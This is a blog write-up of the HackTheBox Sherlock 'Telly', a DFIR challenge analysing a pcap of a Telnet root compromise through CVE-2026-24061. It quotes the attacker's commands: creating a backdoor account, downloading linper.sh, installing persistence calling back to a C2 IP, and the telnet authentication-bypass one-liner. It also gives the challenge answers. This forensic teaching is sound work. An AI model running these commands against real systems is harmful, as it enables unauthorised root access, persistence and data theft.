---
title: Sherlock - Telly writeup
date: 2026-04-21
draft: false
showToc: true 
tags:
  - Forensics
  - Linux
---

This post today will be about Telly - a HackTheBox Sherlock about the shiny new vulnerability of Telnet where it grants you sudo from userspace, in a pretty trivial manner.

I will do a walkthrough the tasks in Sherlock first, then we will go on how this particular CVE works. 


## Scenario 
You are a Junior DFIR Analyst at an MSSP that provides continuous monitoring and DFIR services to SMBs. Your supervisor has tasked you with analyzing network telemetry from a compromised backup server. A DLP solution flagged a possible data exfiltration attempt from this server. According to the IT team, this server wasn't very busy and was sometimes used to store backups.

**Folder structure** 
```
❯ tree
.
└── monitoringservice_export_202610AM-11AM.pcapng
```

## Task 1
_What CVE is associated with the vulnerability exploited in the Telnet protocol?_

When I first skim on the whole log, it was like:"That's weird, how did you get into root right away? And with Telnet? That's strange". 

Then I hit up Google and saw search result for "Telnet root vulnerability". And, it was [CVE-2026-24061](https://www.txone.com/blog/cve-2026-24061-gnu-inetutils-telnet-exploitation/).

## Task 2 
_When was the Telnet vulnerability successfully exploited, granting the attacker remote root access on the target machine?_

It's when the first TELNET protocol appeared in the log. 

Answer: 2026-01-27 10:39:28

## Task 3
_What is the hostname of the targeted server?_

Right-click on the above telnet event > Follow > Follow TCP Stream, you should see within the first lines: 

```
Linux 6.8.0-90-generic (backup-secondary) (pts/1)
```

It is highly recommended that you read everything in that TCP stream first before you proceed further, as the rest of the writeup will constantly refer to it one way or another. Luckily, it's a short one.


## Task 4 
_The attacker created a backdoor account to maintain future access. What username and password were set for that account?_

Same TCP stream, scroll down further a bit and you will see these lines: 
```
.[200~sudo useradd -m -s /bin/bash cleanupsvc; echo "cleanupsvc:YouKnowWhoiam69" | sudo chpasswd.[201~
.[7msudo useradd -m -s /bin/bash cleanupsvc; echo "cleanupsvc:YouKnowWhoiam69" | sudo chpasswd.[27m
```

Without all the surrounding mess, it should be:

```
sudo useradd -m -s /bin/bash cleanupsvc; echo "cleanupsvc:YouKnowWhoiam69" | sudo chpasswd
```

## Task 5 
_What was the full command the attacker used to download the persistence script?_

After finding out the **sensitive database**, the hacker began to install a persistance and execute script, namely `linper.sh`. 

In the TCP stream: 
```
..[?2004h.]0;root@backup-secondary: /tmp.root@backup-secondary:/tmp# 
w
w
g
g
e
e
t
t
 
 
.[200~https://raw.githubusercontent.com/montysecurity/linper/refs/heads/main/linper.sh.[201~
.[7mhttps://raw.githubusercontent.com/montysecurity/linper/refs/heads/main/linper.sh.[27m
```

In clean format: 
```
wget https://raw.githubusercontent.com/montysecurity/linper/refs/heads/main/linper.sh
```

## Task 6 
_The attacker installed remote access persistence using the persistence script. What is the C2 IP address?_

I make a blind guess on the IP that appeared in the middle of the stream, and somehow it was right. After everything is done, I look back on the task and lookup on how to use the [linper.sh](https://github.com/montysecurity/linper).

After the attacker successfully installed the script, they `chmod +x` it, then, in chronological order: 

```
bash linper.sh --enum-defenses

bash linper.sh -i 91.99.25.54 -p 5599 --stealth-mode
```

## Task 7
_The attacker exfiltrated a sensitive database file. At what time was this file exfiltrated?_

The time that occured such event should be from this line: 

```
192.168.72.131 - - [27/Jan/2026 10:49:54] "GET /credit-cards-25-blackfriday.db HTTP/1.1" 200 -
```

This mark that the attacker has successfully transfered to themselves the sensitive data. 

## Task 8 
_Analyze the exfiltrated database. To follow compliance requirements, the breached organization needs to notify its customers. For data validation purposes, find the credit card number for a customer named Quinn Harris._

To do this challenge, you need to use a wireshark feature - Export Object. Go to: 

```
File > Export Object > HTTP > Pick the database 
```
Now when you have the exported database, it's a good rule of thumb to check what kind of database you have before trying to read it, by using the command `file`, available on both Linux/MacOSX and Windows. 

```
❯ file credit-cards-25-blackfriday.db 
credit-cards-25-blackfriday.db: SQLite 3.x database, last written using SQLite version 3046001, file counter 7, database pages 3, cookie 0x7, schema 4, UTF-8, version-valid-for 7
```

So, you know that we will need a sqlite reader. 

In this case, I can give you an example how I read this file on a Linux machine with command-line interface (CLI). 

First, install sqlite3 with your respective distro's method. Mine is, for example: 
```
sudo pacman -S sqlite3
```

Then launch the interactive shell: 

```
❯ sqlite3 credit-cards-25-blackfriday.db  
SQLite version 3.53.0 2026-04-09 11:41:38
Enter ".help" for usage hints.
sqlite> .tables
purchases
```

Now, we need to list the table: 

```
sqlite> SELECT * FROM purchases 
```

You will see Quinn Harris email there. 

## CVE-2026-24061: Root via Telnet 

Reference: 
- [txOne Network](https://www.txone.com/blog/cve-2026-24061-gnu-inetutils-telnet-exploitation/)
- [OffSec](https://www.offsec.com/blog/cve-2026-24061/)

> CVE‑2026‑24061 is a critical authentication‑bypass vulnerability in GNU inetutils telnetd. During Telnet option negotiation, a remote client can inject environment variables using the NEW‑ENVIRON mechanism (RFC 1572). On vulnerable telnetd versions, the value of USER is forwarded unsanitized to the system login program; setting USER=-f root causes login to treat the session as “pre‑authenticated,” yielding an unauthenticated root shell. Because telnetd directly passes the USER environment variable as an argument to /bin/login, the injected value is interpreted as a command-line option rather than a username.

In other words, the attacker executes this command (or something else similar using the same mechanism stated above) to bypass authentication: 

```
USER='-f root' telnet -a <ipaddr>
```



